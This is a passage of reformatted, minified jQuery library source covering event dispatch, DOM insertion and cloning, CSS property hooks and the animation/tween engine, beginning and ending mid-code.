              return void 0 !== b && b.event.triggered !== t.type
                ? b.event.dispatch.apply(e, arguments)
                : void 0;
            }),
          c = (t = (t || "").match(P) || [""]).length;
          c--;

        )
          (f = v = (a = be.exec(t[c]) || [])[1]),
            (h = (a[2] || "").split(".").sort()),
            f &&
            ((u = b.event.special[f] || {}),
              (f = (o ? u.delegateType : u.bindType) || f),
              (u = b.event.special[f] || {}),
              (d = b.extend(
                {
                  type: f,
                  origType: v,
                  data: i,
                  handler: n,
                  guid: n.guid,
                  selector: o,
                  needsContext: o && b.expr.match.needsContext.test(o),
                  namespace: h.join("."),
                },
                r
              )),
              (p = l[f]) ||
              (((p = l[f] = []).delegateCount = 0),
                (u.setup && !1 !== u.setup.call(e, i, h, s)) ||
                (e.addEventListener && e.addEventListener(f, s))),
              u.add &&
              (u.add.call(e, d), d.handler.guid || (d.handler.guid = n.guid)),
              o ? p.splice(p.delegateCount++, 0, d) : p.push(d),
              (b.event.global[f] = !0));
    },
    remove: function (e, t, n, i, o) {
      var r,
        s,
        a,
        l,
        c,
        d,
        u,
        p,
        f,
        h,
        v,
        g = G.hasData(e) && G.get(e);
      if (g && (l = g.events)) {
        for (c = (t = (t || "").match(P) || [""]).length; c--;)
          if (
            ((f = v = (a = be.exec(t[c]) || [])[1]),
              (h = (a[2] || "").split(".").sort()),
              f)
          ) {
            for (
              u = b.event.special[f] || {},
              p = l[(f = (i ? u.delegateType : u.bindType) || f)] || [],
              a =
              a[2] &&
              new RegExp("(^|\\.)" + h.join("\\.(?:.*\\.|)") + "(\\.|$)"),
              s = r = p.length;
              r--;

            )
              (d = p[r]),
                (!o && v !== d.origType) ||
                (n && n.guid !== d.guid) ||
                (a && !a.test(d.namespace)) ||
                (i && i !== d.selector && ("**" !== i || !d.selector)) ||
                (p.splice(r, 1),
                  d.selector && p.delegateCount--,
                  u.remove && u.remove.call(e, d));
            s &&
              !p.length &&
              ((u.teardown && !1 !== u.teardown.call(e, h, g.handle)) ||
                b.removeEvent(e, f, g.handle),
                delete l[f]);
          } else for (f in l) b.event.remove(e, f + t[c], n, i, !0);
        b.isEmptyObject(l) && G.remove(e, "handle events");
      }
    },
    dispatch: function (e) {
      var t,
        n,
        i,
        o,
        r,
        s,
        a = b.event.fix(e),
        l = new Array(arguments.length),
        c = (G.get(this, "events") || {})[a.type] || [],
        d = b.event.special[a.type] || {};
      for (l[0] = a, t = 1; t < arguments.length; t++) l[t] = arguments[t];
      if (
        ((a.delegateTarget = this),
          !d.preDispatch || !1 !== d.preDispatch.call(this, a))
      ) {
        for (
          s = b.event.handlers.call(this, a, c), t = 0;
          (o = s[t++]) && !a.isPropagationStopped();

        )
          for (
            a.currentTarget = o.elem, n = 0;
            (r = o.handlers[n++]) && !a.isImmediatePropagationStopped();

          )
            (a.rnamespace && !a.rnamespace.test(r.namespace)) ||
              ((a.handleObj = r),
                (a.data = r.data),
                void 0 !==
                (i = (
                  (b.event.special[r.origType] || {}).handle || r.handler
                ).apply(o.elem, l)) &&
                !1 === (a.result = i) &&
                (a.preventDefault(), a.stopPropagation()));
        return d.postDispatch && d.postDispatch.call(this, a), a.result;
      }
    },
    handlers: function (e, t) {
      var n,
        i,
        o,
        r,
        s,
        a = [],
        l = t.delegateCount,
        c = e.target;
      if (l && c.nodeType && !("click" === e.type && e.button >= 1))
        for (; c !== this; c = c.parentNode || this)
          if (1 === c.nodeType && ("click" !== e.type || !0 !== c.disabled)) {
            for (r = [], s = {}, n = 0; n < l; n++)
              void 0 === s[(o = (i = t[n]).selector + " ")] &&
                (s[o] = i.needsContext
                  ? b(o, this).index(c) > -1
                  : b.find(o, this, null, [c]).length),
                s[o] && r.push(i);
            r.length && a.push({ elem: c, handlers: r });
          }
      return (
        (c = this), l < t.length && a.push({ elem: c, handlers: t.slice(l) }), a
      );
    },
    addProp: function (e, t) {
      Object.defineProperty(b.Event.prototype, e, {
        enumerable: !0,
        configurable: !0,
        get: v(t)
          ? function () {
            if (this.originalEvent) return t(this.originalEvent);
          }
          : function () {
            if (this.originalEvent) return this.originalEvent[e];
          },
        set: function (t) {
          Object.defineProperty(this, e, {
            enumerable: !0,
            configurable: !0,
            writable: !0,
            value: t,
          });
        },
      });
    },
    fix: function (e) {
      return e[b.expando] ? e : new b.Event(e);
    },
    special: {
      load: { noBubble: !0 },
      focus: {
        trigger: function () {
          if (this !== Te() && this.focus) return this.focus(), !1;
        },
        delegateType: "focusin",
      },
      blur: {
        trigger: function () {
          if (this === Te() && this.blur) return this.blur(), !1;
        },
        delegateType: "focusout",
      },
      click: {
        trigger: function () {
          if ("checkbox" === this.type && this.click && A(this, "input"))
            return this.click(), !1;
        },
        _default: function (e) {
          return A(e.target, "a");
        },
      },
      beforeunload: {
        postDispatch: function (e) {
          void 0 !== e.result &&
            e.originalEvent &&
            (e.originalEvent.returnValue = e.result);
        },
      },
    },
  }),
    (b.removeEvent = function (e, t, n) {
      e.removeEventListener && e.removeEventListener(t, n);
    }),
    (b.Event = function (e, t) {
      if (!(this instanceof b.Event)) return new b.Event(e, t);
      e && e.type
        ? ((this.originalEvent = e),
          (this.type = e.type),
          (this.isDefaultPrevented =
            e.defaultPrevented ||
              (void 0 === e.defaultPrevented && !1 === e.returnValue)
              ? xe
              : ke),
          (this.target =
            e.target && 3 === e.target.nodeType
              ? e.target.parentNode
              : e.target),
          (this.currentTarget = e.currentTarget),
          (this.relatedTarget = e.relatedTarget))
        : (this.type = e),
        t && b.extend(this, t),
        (this.timeStamp = (e && e.timeStamp) || Date.now()),
        (this[b.expando] = !0);
    }),
    (b.Event.prototype = {
      constructor: b.Event,
      isDefaultPrevented: ke,
      isPropagationStopped: ke,
      isImmediatePropagationStopped: ke,
      isSimulated: !1,
      preventDefault: function () {
        var e = this.originalEvent;
        (this.isDefaultPrevented = xe),
          e && !this.isSimulated && e.preventDefault();
      },
      stopPropagation: function () {
        var e = this.originalEvent;
        (this.isPropagationStopped = xe),
          e && !this.isSimulated && e.stopPropagation();
      },
      stopImmediatePropagation: function () {
        var e = this.originalEvent;
        (this.isImmediatePropagationStopped = xe),
          e && !this.isSimulated && e.stopImmediatePropagation(),
          this.stopPropagation();
      },
    }),
    b.each(
      {
        altKey: !0,
        bubbles: !0,
        cancelable: !0,
        changedTouches: !0,
        ctrlKey: !0,
        detail: !0,
        eventPhase: !0,
        metaKey: !0,
        pageX: !0,
        pageY: !0,
        shiftKey: !0,
        view: !0,
        char: !0,
        charCode: !0,
        key: !0,
        keyCode: !0,
        button: !0,
        buttons: !0,
        clientX: !0,
        clientY: !0,
        offsetX: !0,
        offsetY: !0,
        pointerId: !0,
        pointerType: !0,
        screenX: !0,
        screenY: !0,
        targetTouches: !0,
        toElement: !0,
        touches: !0,
        which: function (e) {
          var t = e.button;
          return null == e.which && me.test(e.type)
            ? null != e.charCode
              ? e.charCode
              : e.keyCode
            : !e.which && void 0 !== t && we.test(e.type)
              ? 1 & t
                ? 1
                : 2 & t
                  ? 3
                  : 4 & t
                    ? 2
                    : 0
              : e.which;
        },
      },
      b.event.addProp
    ),
    b.each(
      {
        mouseenter: "mouseover",
        mouseleave: "mouseout",
        pointerenter: "pointerover",
        pointerleave: "pointerout",
      },
      function (e, t) {
        b.event.special[e] = {
          delegateType: t,
          bindType: t,
          handle: function (e) {
            var n,
              i = this,
              o = e.relatedTarget,
              r = e.handleObj;
            return (
              (o && (o === i || b.contains(i, o))) ||
              ((e.type = r.origType),
                (n = r.handler.apply(this, arguments)),
                (e.type = t)),
              n
            );
          },
        };
      }
    ),
    b.fn.extend({
      on: function (e, t, n, i) {
        return Se(this, e, t, n, i);
      },
      one: function (e, t, n, i) {
        return Se(this, e, t, n, i, 1);
      },
      off: function (e, t, n) {
        var i, o;
        if (e && e.preventDefault && e.handleObj)
          return (
            (i = e.handleObj),
            b(e.delegateTarget).off(
              i.namespace ? i.origType + "." + i.namespace : i.origType,
              i.selector,
              i.handler
            ),
            this
          );
        if ("object" == typeof e) {
          for (o in e) this.off(o, t, e[o]);
          return this;
        }
        return (
          (!1 !== t && "function" != typeof t) || ((n = t), (t = void 0)),
          !1 === n && (n = ke),
          this.each(function () {
            b.event.remove(this, e, n, t);
          })
        );
      },
    });
  var Ce =
    /<(?!area|br|col|embed|hr|img|input|link|meta|param)(([a-z][^\/\0>\x20\t\r\n\f]*)[^>]*)\/>/gi,
    $e = /<script|<style|<link/i,
    Ae = /checked\s*(?:[^=]|=\s*.checked.)/i,
    Ee = /^\s*<!(?:\[CDATA\[|--)|(?:\]\]|--)>\s*$/g;
  function je(e, t) {
    return (
      (A(e, "table") &&
        A(11 !== t.nodeType ? t : t.firstChild, "tr") &&
        b(e).children("tbody")[0]) ||
      e
    );
  }
  function De(e) {
    return (e.type = (null !== e.getAttribute("type")) + "/" + e.type), e;
  }
  function Ne(e) {
    return (
      "true/" === (e.type || "").slice(0, 5)
        ? (e.type = e.type.slice(5))
        : e.removeAttribute("type"),
      e
    );
  }
  function He(e, t) {
    var n, i, o, r, s, a, l, c;
    if (1 === t.nodeType) {
      if (
        G.hasData(e) &&
        ((r = G.access(e)), (s = G.set(t, r)), (c = r.events))
      )
        for (o in (delete s.handle, (s.events = {}), c))
          for (n = 0, i = c[o].length; n < i; n++) b.event.add(t, o, c[o][n]);
      Q.hasData(e) && ((a = Q.access(e)), (l = b.extend({}, a)), Q.set(t, l));
    }
  }
  function Oe(e, t) {
    var n = t.nodeName.toLowerCase();
    "input" === n && ce.test(e.type)
      ? (t.checked = e.checked)
      : ("input" !== n && "textarea" !== n) ||
      (t.defaultValue = e.defaultValue);
  }
  function Le(e, t, n, i) {
    t = s.apply([], t);
    var o,
      r,
      a,
      l,
      c,
      d,
      u = 0,
      p = e.length,
      f = p - 1,
      g = t[0],
      y = v(g);
    if (y || (p > 1 && "string" == typeof g && !h.checkClone && Ae.test(g)))
      return e.each(function (o) {
        var r = e.eq(o);
        y && (t[0] = g.call(this, o, r.html())), Le(r, t, n, i);
      });
    if (
      p &&
      ((r = (o = ge(t, e[0].ownerDocument, !1, e, i)).firstChild),
        1 === o.childNodes.length && (o = r),
        r || i)
    ) {
      for (l = (a = b.map(fe(o, "script"), De)).length; u < p; u++)
        (c = o),
          u !== f &&
          ((c = b.clone(c, !0, !0)), l && b.merge(a, fe(c, "script"))),
          n.call(e[u], c, u);
      if (l)
        for (d = a[a.length - 1].ownerDocument, b.map(a, Ne), u = 0; u < l; u++)
          (c = a[u]),
            ue.test(c.type || "") &&
            !G.access(c, "globalEval") &&
            b.contains(d, c) &&
            (c.src && "module" !== (c.type || "").toLowerCase()
              ? b._evalUrl && b._evalUrl(c.src)
              : m(c.textContent.replace(Ee, ""), d, c));
    }
    return e;
  }
  function Pe(e, t, n) {
    for (var i, o = t ? b.filter(t, e) : e, r = 0; null != (i = o[r]); r++)
      n || 1 !== i.nodeType || b.cleanData(fe(i)),
        i.parentNode &&
        (n && b.contains(i.ownerDocument, i) && he(fe(i, "script")),
          i.parentNode.removeChild(i));
    return e;
  }
  b.extend({
    htmlPrefilter: function (e) {
      return e.replace(Ce, "<$1></$2>");
    },
    clone: function (e, t, n) {
      var i,
        o,
        r,
        s,
        a = e.cloneNode(!0),
        l = b.contains(e.ownerDocument, e);
      if (
        !(
          h.noCloneChecked ||
          (1 !== e.nodeType && 11 !== e.nodeType) ||
          b.isXMLDoc(e)
        )
      )
        for (s = fe(a), i = 0, o = (r = fe(e)).length; i < o; i++)
          Oe(r[i], s[i]);
      if (t)
        if (n)
          for (r = r || fe(e), s = s || fe(a), i = 0, o = r.length; i < o; i++)
            He(r[i], s[i]);
        else He(e, a);
      return (
        (s = fe(a, "script")).length > 0 && he(s, !l && fe(e, "script")), a
      );
    },
    cleanData: function (e) {
      for (var t, n, i, o = b.event.special, r = 0; void 0 !== (n = e[r]); r++)
        if (Y(n)) {
          if ((t = n[G.expando])) {
            if (t.events)
              for (i in t.events)
                o[i] ? b.event.remove(n, i) : b.removeEvent(n, i, t.handle);
            n[G.expando] = void 0;
          }
          n[Q.expando] && (n[Q.expando] = void 0);
        }
    },
  }),
    b.fn.extend({
      detach: function (e) {
        return Pe(this, e, !0);
      },
      remove: function (e) {
        return Pe(this, e);
      },
      text: function (e) {
        return F(
          this,
          function (e) {
            return void 0 === e
              ? b.text(this)
              : this.empty().each(function () {
                (1 !== this.nodeType &&
                  11 !== this.nodeType &&
                  9 !== this.nodeType) ||
                  (this.textContent = e);
              });
          },
          null,
          e,
          arguments.length
        );
      },
      append: function () {
        return Le(this, arguments, function (e) {
          (1 !== this.nodeType &&
            11 !== this.nodeType &&
            9 !== this.nodeType) ||
            je(this, e).appendChild(e);
        });
      },
      prepend: function () {
        return Le(this, arguments, function (e) {
          if (
            1 === this.nodeType ||
            11 === this.nodeType ||
            9 === this.nodeType
          ) {
            var t = je(this, e);
            t.insertBefore(e, t.firstChild);
          }
        });
      },
      before: function () {
        return Le(this, arguments, function (e) {
          this.parentNode && this.parentNode.insertBefore(e, this);
        });
      },
      after: function () {
        return Le(this, arguments, function (e) {
          this.parentNode && this.parentNode.insertBefore(e, this.nextSibling);
        });
      },
      empty: function () {
        for (var e, t = 0; null != (e = this[t]); t++)
          1 === e.nodeType && (b.cleanData(fe(e, !1)), (e.textContent = ""));
        return this;
      },
      clone: function (e, t) {
        return (
          (e = null != e && e),
          (t = null == t ? e : t),
          this.map(function () {
            return b.clone(this, e, t);
          })
        );
      },
      html: function (e) {
        return F(
          this,
          function (e) {
            var t = this[0] || {},
              n = 0,
              i = this.length;
            if (void 0 === e && 1 === t.nodeType) return t.innerHTML;
            if (
              "string" == typeof e &&
              !$e.test(e) &&
              !pe[(de.exec(e) || ["", ""])[1].toLowerCase()]
            ) {
              e = b.htmlPrefilter(e);
              try {
                for (; n < i; n++)
                  1 === (t = this[n] || {}).nodeType &&
                    (b.cleanData(fe(t, !1)), (t.innerHTML = e));
                t = 0;
              } catch (e) { }
            }
            t && this.empty().append(e);
          },
          null,
          e,
          arguments.length
        );
      },
      replaceWith: function () {
        var e = [];
        return Le(
          this,
          arguments,
          function (t) {
            var n = this.parentNode;
            b.inArray(this, e) < 0 &&
              (b.cleanData(fe(this)), n && n.replaceChild(t, this));
          },
          e
        );
      },
    }),
    b.each(
      {
        appendTo: "append",
        prependTo: "prepend",
        insertBefore: "before",
        insertAfter: "after",
        replaceAll: "replaceWith",
      },
      function (e, t) {
        b.fn[e] = function (e) {
          for (var n, i = [], o = b(e), r = o.length - 1, s = 0; s <= r; s++)
            (n = s === r ? this : this.clone(!0)),
              b(o[s])[t](n),
              a.apply(i, n.get());
          return this.pushStack(i);
        };
      }
    );
  var qe = new RegExp("^(" + ee + ")(?!px)[a-z%]+$", "i"),
    Me = function (t) {
      var n = t.ownerDocument.defaultView;
      return (n && n.opener) || (n = e), n.getComputedStyle(t);
    },
    Ie = new RegExp(ne.join("|"), "i");
  function ze(e, t, n) {
    var i,
      o,
      r,
      s,
      a = e.style;
    return (
      (n = n || Me(e)) &&
      ("" !== (s = n.getPropertyValue(t) || n[t]) ||
        b.contains(e.ownerDocument, e) ||
        (s = b.style(e, t)),
        !h.pixelBoxStyles() &&
        qe.test(s) &&
        Ie.test(t) &&
        ((i = a.width),
          (o = a.minWidth),
          (r = a.maxWidth),
          (a.minWidth = a.maxWidth = a.width = s),
          (s = n.width),
          (a.width = i),
          (a.minWidth = o),
          (a.maxWidth = r))),
      void 0 !== s ? s + "" : s
    );
  }
  function We(e, t) {
    return {
      get: function () {
        if (!e()) return (this.get = t).apply(this, arguments);
        delete this.get;
      },
    };
  }
  !(function () {
    function t() {
      if (d) {
        (c.style.cssText =
          "position:absolute;left:-11111px;width:60px;margin-top:1px;padding:0;border:0"),
          (d.style.cssText =
            "position:relative;display:block;box-sizing:border-box;overflow:scroll;margin:auto;border:1px;padding:1px;width:60%;top:1%"),
          ye.appendChild(c).appendChild(d);
        var t = e.getComputedStyle(d);
        (o = "1%" !== t.top),
          (l = 12 === n(t.marginLeft)),
          (d.style.right = "60%"),
          (a = 36 === n(t.right)),
          (r = 36 === n(t.width)),
          (d.style.position = "absolute"),
          (s = 36 === d.offsetWidth || "absolute"),
          ye.removeChild(c),
          (d = null);
      }
    }
    function n(e) {
      return Math.round(parseFloat(e));
    }
    var o,
      r,
      s,
      a,
      l,
      c = i.createElement("div"),
      d = i.createElement("div");
    d.style &&
      ((d.style.backgroundClip = "content-box"),
        (d.cloneNode(!0).style.backgroundClip = ""),
        (h.clearCloneStyle = "content-box" === d.style.backgroundClip),
        b.extend(h, {
          boxSizingReliable: function () {
            return t(), r;
          },
          pixelBoxStyles: function () {
            return t(), a;
          },
          pixelPosition: function () {
            return t(), o;
          },
          reliableMarginLeft: function () {
            return t(), l;
          },
          scrollboxSize: function () {
            return t(), s;
          },
        }));
  })();
  var Re = /^(none|table(?!-c[ea]).+)/,
    Fe = /^--/,
    Be = { position: "absolute", visibility: "hidden", display: "block" },
    Ue = { letterSpacing: "0", fontWeight: "400" },
    Xe = ["Webkit", "Moz", "ms"],
    _e = i.createElement("div").style;
  function Ye(e) {
    var t = b.cssProps[e];
    return (
      t ||
      (t = b.cssProps[e] =
        (function (e) {
          if (e in _e) return e;
          for (var t = e[0].toUpperCase() + e.slice(1), n = Xe.length; n--;)
            if ((e = Xe[n] + t) in _e) return e;
        })(e) || e),
      t
    );
  }
  function Ve(e, t, n) {
    var i = te.exec(t);
    return i ? Math.max(0, i[2] - (n || 0)) + (i[3] || "px") : t;
  }
  function Ge(e, t, n, i, o, r) {
    var s = "width" === t ? 1 : 0,
      a = 0,
      l = 0;
    if (n === (i ? "border" : "content")) return 0;
    for (; s < 4; s += 2)
      "margin" === n && (l += b.css(e, n + ne[s], !0, o)),
        i
          ? ("content" === n && (l -= b.css(e, "padding" + ne[s], !0, o)),
            "margin" !== n &&
            (l -= b.css(e, "border" + ne[s] + "Width", !0, o)))
          : ((l += b.css(e, "padding" + ne[s], !0, o)),
            "padding" !== n
              ? (l += b.css(e, "border" + ne[s] + "Width", !0, o))
              : (a += b.css(e, "border" + ne[s] + "Width", !0, o)));
    return (
      !i &&
      r >= 0 &&
      (l += Math.max(
        0,
        Math.ceil(
          e["offset" + t[0].toUpperCase() + t.slice(1)] - r - l - a - 0.5
        )
      )),
      l
    );
  }
  function Qe(e, t, n) {
    var i = Me(e),
      o = ze(e, t, i),
      r = "border-box" === b.css(e, "boxSizing", !1, i),
      s = r;
    if (qe.test(o)) {
      if (!n) return o;
      o = "auto";
    }
    return (
      (s = s && (h.boxSizingReliable() || o === e.style[t])),
      ("auto" === o ||
        (!parseFloat(o) && "inline" === b.css(e, "display", !1, i))) &&
      ((o = e["offset" + t[0].toUpperCase() + t.slice(1)]), (s = !0)),
      (o = parseFloat(o) || 0) +
      Ge(e, t, n || (r ? "border" : "content"), s, i, o) +
      "px"
    );
  }
  function Je(e, t, n, i, o) {
    return new Je.prototype.init(e, t, n, i, o);
  }
  b.extend({
    cssHooks: {
      opacity: {
        get: function (e, t) {
          if (t) {
            var n = ze(e, "opacity");
            return "" === n ? "1" : n;
          }
        },
      },
    },
    cssNumber: {
      animationIterationCount: !0,
      columnCount: !0,
      fillOpacity: !0,
      flexGrow: !0,
      flexShrink: !0,
      fontWeight: !0,
      lineHeight: !0,
      opacity: !0,
      order: !0,
      orphans: !0,
      widows: !0,
      zIndex: !0,
      zoom: !0,
    },
    cssProps: {},
    style: function (e, t, n, i) {
      if (e && 3 !== e.nodeType && 8 !== e.nodeType && e.style) {
        var o,
          r,
          s,
          a = _(t),
          l = Fe.test(t),
          c = e.style;
        if (
          (l || (t = Ye(a)), (s = b.cssHooks[t] || b.cssHooks[a]), void 0 === n)
        )
          return s && "get" in s && void 0 !== (o = s.get(e, !1, i)) ? o : c[t];
        "string" == (r = typeof n) &&
          (o = te.exec(n)) &&
          o[1] &&
          ((n = re(e, t, o)), (r = "number")),
          null != n &&
          n == n &&
          ("number" === r &&
            (n += (o && o[3]) || (b.cssNumber[a] ? "" : "px")),
            h.clearCloneStyle ||
            "" !== n ||
            0 !== t.indexOf("background") ||
            (c[t] = "inherit"),
            (s && "set" in s && void 0 === (n = s.set(e, n, i))) ||
            (l ? c.setProperty(t, n) : (c[t] = n)));
      }
    },
    css: function (e, t, n, i) {
      var o,
        r,
        s,
        a = _(t);
      return (
        Fe.test(t) || (t = Ye(a)),
        (s = b.cssHooks[t] || b.cssHooks[a]) &&
        "get" in s &&
        (o = s.get(e, !0, n)),
        void 0 === o && (o = ze(e, t, i)),
        "normal" === o && t in Ue && (o = Ue[t]),
        "" === n || n
          ? ((r = parseFloat(o)), !0 === n || isFinite(r) ? r || 0 : o)
          : o
      );
    },
  }),
    b.each(["height", "width"], function (e, t) {
      b.cssHooks[t] = {
        get: function (e, n, i) {
          if (n)
            return !Re.test(b.css(e, "display")) ||
              (e.getClientRects().length && e.getBoundingClientRect().width)
              ? Qe(e, t, i)
              : oe(e, Be, function () {
                return Qe(e, t, i);
              });
        },
        set: function (e, n, i) {
          var o,
            r = Me(e),
            s = "border-box" === b.css(e, "boxSizing", !1, r),
            a = i && Ge(e, t, i, s, r);
          return (
            s &&
            h.scrollboxSize() === r.position &&
            (a -= Math.ceil(
              e["offset" + t[0].toUpperCase() + t.slice(1)] -
              parseFloat(r[t]) -
              Ge(e, t, "border", !1, r) -
              0.5
            )),
            a &&
            (o = te.exec(n)) &&
            "px" !== (o[3] || "px") &&
            ((e.style[t] = n), (n = b.css(e, t))),
            Ve(0, n, a)
          );
        },
      };
    }),
    (b.cssHooks.marginLeft = We(h.reliableMarginLeft, function (e, t) {
      if (t)
        return (
          (parseFloat(ze(e, "marginLeft")) ||
            e.getBoundingClientRect().left -
            oe(e, { marginLeft: 0 }, function () {
              return e.getBoundingClientRect().left;
            })) + "px"
        );
    })),
    b.each({ margin: "", padding: "", border: "Width" }, function (e, t) {
      (b.cssHooks[e + t] = {
        expand: function (n) {
          for (
            var i = 0, o = {}, r = "string" == typeof n ? n.split(" ") : [n];
            i < 4;
            i++
          )
            o[e + ne[i] + t] = r[i] || r[i - 2] || r[0];
          return o;
        },
      }),
        "margin" !== e && (b.cssHooks[e + t].set = Ve);
    }),
    b.fn.extend({
      css: function (e, t) {
        return F(
          this,
          function (e, t, n) {
            var i,
              o,
              r = {},
              s = 0;
            if (Array.isArray(t)) {
              for (i = Me(e), o = t.length; s < o; s++)
                r[t[s]] = b.css(e, t[s], !1, i);
              return r;
            }
            return void 0 !== n ? b.style(e, t, n) : b.css(e, t);
          },
          e,
          t,
          arguments.length > 1
        );
      },
    }),
    (b.Tween = Je),
    (Je.prototype = {
      constructor: Je,
      init: function (e, t, n, i, o, r) {
        (this.elem = e),
          (this.prop = n),
          (this.easing = o || b.easing._default),
          (this.options = t),
          (this.start = this.now = this.cur()),
          (this.end = i),
          (this.unit = r || (b.cssNumber[n] ? "" : "px"));
      },
      cur: function () {
        var e = Je.propHooks[this.prop];
        return e && e.get ? e.get(this) : Je.propHooks._default.get(this);
      },
      run: function (e) {
        var t,
          n = Je.propHooks[this.prop];
        return (
          this.options.duration
            ? (this.pos = t =
              b.easing[this.easing](
                e,
                this.options.duration * e,
                0,
                1,
                this.options.duration
              ))
            : (this.pos = t = e),
          (this.now = (this.end - this.start) * t + this.start),
          this.options.step &&
          this.options.step.call(this.elem, this.now, this),
          n && n.set ? n.set(this) : Je.propHooks._default.set(this),
          this
        );
      },
    }),
    (Je.prototype.init.prototype = Je.prototype),
    (Je.propHooks = {
      _default: {
        get: function (e) {
          var t;
          return 1 !== e.elem.nodeType ||
            (null != e.elem[e.prop] && null == e.elem.style[e.prop])
            ? e.elem[e.prop]
            : (t = b.css(e.elem, e.prop, "")) && "auto" !== t
              ? t
              : 0;
        },
        set: function (e) {
          b.fx.step[e.prop]
            ? b.fx.step[e.prop](e)
            : 1 !== e.elem.nodeType ||
              (null == e.elem.style[b.cssProps[e.prop]] && !b.cssHooks[e.prop])
              ? (e.elem[e.prop] = e.now)
              : b.style(e.elem, e.prop, e.now + e.unit);
        },
      },
    }),
    (Je.propHooks.scrollTop = Je.propHooks.scrollLeft =
    {
      set: function (e) {
        e.elem.nodeType && e.elem.parentNode && (e.elem[e.prop] = e.now);
      },
    }),
    (b.easing = {
      linear: function (e) {
        return e;
      },
      swing: function (e) {
        return 0.5 - Math.cos(e * Math.PI) / 2;
      },
      _default: "swing",
    }),
    (b.fx = Je.prototype.init),
    (b.fx.step = {});
  var Ke,
    Ze,
    et = /^(?:toggle|show|hide)$/,
    tt = /queueHooks$/;
  function nt() {
    Ze &&
      (!1 === i.hidden && e.requestAnimationFrame
        ? e.requestAnimationFrame(nt)
        : e.setTimeout(nt, b.fx.interval),
        b.fx.tick());
  }
  function it() {
    return (
      e.setTimeout(function () {
        Ke = void 0;
      }),
      (Ke = Date.now())
    );
  }
  function ot(e, t) {
    var n,
      i = 0,
      o = { height: e };
    for (t = t ? 1 : 0; i < 4; i += 2 - t)
      o["margin" + (n = ne[i])] = o["padding" + n] = e;
    return t && (o.opacity = o.width = e), o;
  }
  function rt(e, t, n) {
    for (
      var i,
      o = (st.tweeners[t] || []).concat(st.tweeners["*"]),
      r = 0,
      s = o.length;
      r < s;
      r++
    )
      if ((i = o[r].call(n, t, e))) return i;
  }
  function st(e, t, n) {
    var i,
      o,
      r = 0,
      s = st.prefilters.length,
      a = b.Deferred().always(function () {
        delete l.elem;
      }),
      l = function () {
        if (o) return !1;
        for (
          var t = Ke || it(),
          n = Math.max(0, c.startTime + c.duration - t),
          i = 1 - (n / c.duration || 0),
          r = 0,
          s = c.tweens.length;
          r < s;
          r++
        )
          c.tweens[r].run(i);
        return (
          a.notifyWith(e, [c, i, n]),
          i < 1 && s
            ? n
            : (s || a.notifyWith(e, [c, 1, 0]), a.resolveWith(e, [c]), !1)
        );
      },
      c = a.promise({
        elem: e,
        props: b.extend({}, t),
        opts: b.extend(!0, { specialEasing: {}, easing: b.easing._default }, n),
        originalProperties: t,
        originalOptions: n,
        startTime: Ke || it(),
        duration: n.duration,
        tweens: [],
        createTween: function (t, n) {
          var i = b.Tween(
            e,
            c.opts,
            t,
            n,
            c.opts.specialEasing[t] || c.opts.easing
          );
          return c.tweens.push(i), i;
        },
        stop: function (t) {
          var n = 0,
            i = t ? c.tweens.length : 0;
          if (o) return this;
          for (o = !0; n < i; n++) c.tweens[n].run(1);
          return (
            t
              ? (a.notifyWith(e, [c, 1, 0]), a.resolveWith(e, [c, t]))
              : a.rejectWith(e, [c, t]),
            this
          );
        },
      }),
      d = c.props;
    for (
      (function (e, t) {
        var n, i, o, r, s;
        for (n in e)
          if (
            ((o = t[(i = _(n))]),
              (r = e[n]),
              Array.isArray(r) && ((o = r[1]), (r = e[n] = r[0])),
              n !== i && ((e[i] = r), delete e[n]),
              (s = b.cssHooks[i]) && ("expand" in s))
          )
            for (n in ((r = s.expand(r)), delete e[i], r))
              (n in e) || ((e[n] = r[n]), (t[n] = o));
          else t[i] = o;
      })(d, c.opts.specialEasing);
      r < s;
      r++
    )
      if ((i = st.prefilters[r].call(c, e, d, c.opts)))
        return (
          v(i.stop) &&
          (b._queueHooks(c.elem, c.opts.queue).stop = i.stop.bind(i)),
          i
        );
    return (
      b.map(d, rt, c),
      v(c.opts.start) && c.opts.start.call(e, c),
      c
        .progress(c.opts.progress)
        .done(c.opts.done, c.opts.complete)
        .fail(c.opts.fail)
        .always(c.opts.always),
      b.fx.timer(b.extend(l, { elem: e, anim: c, queue: c.opts.queue })),
      c
    );
  }
  (b.Animation = b.extend(st, {
    tweeners: {
      "*": [
        function (e, t) {
          var n = this.createTween(e, t);
          return re(n.elem, e, te.exec(t), n), n;
        },
      ],
    },
    tweener: function (e, t) {
      v(e) ? ((t = e), (e = ["*"])) : (e = e.match(P));
      for (var n, i = 0, o = e.length; i < o; i++)
        (n = e[i]),
          (st.tweeners[n] = st.tweeners[n] || []),
          st.tweeners[n].unshift(t);
    },
    prefilters: [
      function (e, t, n) {
        var i,
          o,
          r,
          s,
          a,
          l,
          c,
          d,
          u = "width" in t || "height" in t,
          p = this,
          f = {},
          h = e.style,
          v = e.nodeType && ie(e),
          g = G.get(e, "fxshow");
        for (i in (n.queue ||
          (null == (s = b._queueHooks(e, "fx")).unqueued &&
            ((s.unqueued = 0),
              (a = s.empty.fire),
              (s.empty.fire = function () {
                s.unqueued || a();
              })),
            s.unqueued++,
            p.always(function () {
              p.always(function () {
                s.unqueued--, b.queue(e, "fx").length || s.empty.fire();
              });
            })),
          t))
          if (((o = t[i]), et.test(o))) {
            if (
              (delete t[i],
                (r = r || "toggle" === o),
                o === (v ? "hide" : "show"))
            ) {
              if ("show" !== o || !g || void 0 === g[i]) continue;
              v = !0;
            }
            f[i] = (g && g[i]) || b.style(e, i);
          }
        if ((l = !b.isEmptyObject(t)) || !b.isEmptyObject(f))
          for (i in (u &&
            1 === e.nodeType &&
            ((n.overflow = [h.overflow, h.overflowX, h.overflowY]),
              null == (c = g && g.display) && (c = G.get(e, "display")),
              "none" === (d = b.css(e, "display")) &&
              (c
                ? (d = c)
                : (le([e], !0),
                  (c = e.style.display || c),
                  (d = b.css(e, "display")),
                  le([e]))),
              ("inline" === d || ("inline-block" === d && null != c)) &&
              "none" === b.css(e, "float") &&
              (l ||
                (p.done(function () {
                  h.display = c;
                }),
                  null == c && ((d = h.display), (c = "none" === d ? "" : d))),
                (h.display = "inline-block"))),
            n.overflow &&
            ((h.overflow = "hidden"),
              p.always(function () {
                (h.overflow = n.overflow[0]),
                  (h.overflowX = n.overflow[1]),
                  (h.overflowY = n.overflow[2]);
              })),
            (l = !1),
            f))
            l ||
              (g
                ? "hidden" in g && (v = g.hidden)
                : (g = G.access(e, "fxshow", { display: c })),
                r && (g.hidden = !v),
